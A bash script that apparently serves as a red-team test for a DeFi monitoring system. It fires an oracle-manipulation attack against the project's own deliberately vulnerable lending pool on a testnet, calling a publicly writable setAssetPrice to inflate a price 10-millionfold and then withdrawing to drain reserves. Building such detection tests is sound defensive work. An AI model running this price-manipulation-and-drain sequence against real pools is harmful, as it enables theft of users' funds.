#!/usr/bin/env bash
# Fire a nefarious tx sequence against the deployed FakeLendingPool on 0G
# Galileo (chain id 16602). Models vuln #1 from `tasks/todo.md` §15: the
# attacker manipulates the public oracle (`setAssetPrice`) to inflate the
# price, then drains pool reserves via `withdraw`. Multiple detection tiers
# should fire:
#
#   - tier 2 (oracle deviation): pool price at blockN diverges from blockN-1
#     by orders of magnitude — fires when the setAssetPrice and withdraw land
#     in adjacent blocks (typical given Galileo's ~430 ms block time).
#   - tier 4 (classifier): large withdraw amount + price-manipulation context
#     scores above the SAFE/RISK boundary.
#
# `setAssetPrice` is publicly callable on the deployed pool — that's the
# intentional vuln. We do NOT need admin or attacker contracts.
#
# Sequence:
#   1. mint pUSD if needed (so the attacker has gas-paying activity)
#   2. setAssetPrice(pUSD, 1e25)         <-- 10,000,000x inflation
#   3. withdraw(pUSD, 50 pUSD, attacker) <-- caught by the workflow
#   4. setAssetPrice(pUSD, 1e18)         <-- restore for cleanup
#
# Reads PRIVATE_KEY from contracts/.env (the deployer EOA acting as attacker).
set -euo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

# shellcheck source=/dev/null
set -a
. "$REPO/contracts/.env"
set +a

: "${PRIVATE_KEY:?PRIVATE_KEY missing — set it in contracts/.env (attacker EOA)}"

RPC="${ZEROG_RPC_URL:-https://evmrpc-testnet.0g.ai}"
POOL="${POOL_ADDRESS:-0xb1DE7278b81e1Fd40027bDac751117AE960d8747}"
PUSD="${DEMO_ASSET_ADDRESS:-0x21937016d3E3d43a0c2725F47cC56fcb2B51d615}"
TIP="2gwei"

EOA="$(cast wallet address --private-key "$PRIVATE_KEY")"

# 0G Galileo's RPC occasionally returns null for `eth_getTransactionReceipt`
# before the receipt has propagated, which makes `cast send` throw
# "server returned a null response when a non-null response was expected"
# even though the tx itself landed fine. Use --async (just submit, return
# the tx hash) and then poll for the receipt manually with retry.
send_async_and_wait() {
  local label="$1"; shift
  local hash
  # On Galileo the base fee is ~0, so cast's auto-computed maxFeePerGas
  # (= 2*baseFee + priority) lands below the priority fee → "max priority
  # fee per gas higher than max fee per gas". Pin maxFeePerGas explicitly
  # via --gas-price so it's always >= --priority-gas-price.
  hash="$(cast send --async --rpc-url "$RPC" --private-key "$PRIVATE_KEY" \
    --gas-price 3gwei --priority-gas-price "$TIP" "$@")"
  echo "  tx: $hash"
  for _ in $(seq 1 30); do
    local status
    status="$(cast receipt "$hash" --rpc-url "$RPC" --json 2>/dev/null \
      | sed -n 's/.*"status":"\([^"]*\)".*/\1/p' | head -1)"
    if [ -n "$status" ]; then
      case "$status" in
        0x1|"1"|"success") echo "  status: success ($label)"; return 0 ;;
        *)                 echo "  status: FAILED ($label, status=$status)"; return 1 ;;
      esac
    fi
    sleep 1
  done
  echo "  status: TIMEOUT waiting for receipt ($label)"
  return 1
}

INFLATED_PRICE=10000000000000000000000000   # 1e25 — 10,000,000x normal
NORMAL_PRICE=1000000000000000000             # 1e18 — restore after attack
DRAIN_AMOUNT=50000000000000000000            # 50 pUSD

echo "==> RPC:                  $RPC"
echo "==> Pool:                 $POOL"
echo "==> pUSD:                 $PUSD"
echo "==> Attacker EOA:         $EOA"
echo "==> Inflated price:       $INFLATED_PRICE  (10^7 x normal)"
echo "==> Drain amount:         $DRAIN_AMOUNT  (50 pUSD)"

# --- Step 1: capture baseline -----------------------------------------------
prev_price="$(cast call "$POOL" "getAssetPrice(address)(uint256)" "$PUSD" --rpc-url "$RPC" | awk '{print $1}')"
prev_reserve="$(cast call "$PUSD" "balanceOf(address)(uint256)" "$POOL" --rpc-url "$RPC" | awk '{print $1}')"
echo
echo "==> Pre-attack price:     $prev_price"
echo "==> Pre-attack reserve:   $prev_reserve"

# --- Step 2: manipulate oracle ---------------------------------------------
echo
echo "==> Step 2: setAssetPrice($PUSD, $INFLATED_PRICE)  <-- ORACLE MANIPULATION"
send_async_and_wait "setAssetPrice/inflate" \
  "$POOL" "setAssetPrice(address,uint256)" "$PUSD" "$INFLATED_PRICE"

# Don't sleep — for tier-2 to fire, the workflow needs to see the price
# diverge between blockN-1 (old) and blockN (new). Submit the withdraw
# immediately so it lands in the next block while N-1 still has the old price.

# --- Step 3: drain via inflated price --------------------------------------
echo
echo "==> Step 3: NEFARIOUS withdraw $DRAIN_AMOUNT  <-- caught by Phulax workflow"
send_async_and_wait "withdraw/drain" \
  "$POOL" "withdraw(address,uint256,address)" "$PUSD" "$DRAIN_AMOUNT" "$EOA" || true

# --- Step 4: restore oracle (for repeatable demos) -------------------------
echo
echo "==> Step 4: restore price to $NORMAL_PRICE (cleanup)"
send_async_and_wait "setAssetPrice/restore" \
  "$POOL" "setAssetPrice(address,uint256)" "$PUSD" "$NORMAL_PRICE"

echo
echo "Done. Watch the workflow run in KH; expected outcome: FIRE."
echo "  ssh root@\$PHULAX_HOST 'cd /opt/phulax && docker compose logs -f keeperhub | grep -iE \"workflow|detect|classify|decide|withdraw\"'"
echo "  https://\$PHULAX_HOST/  →  Workflows → Phulax Guardian → most recent run"
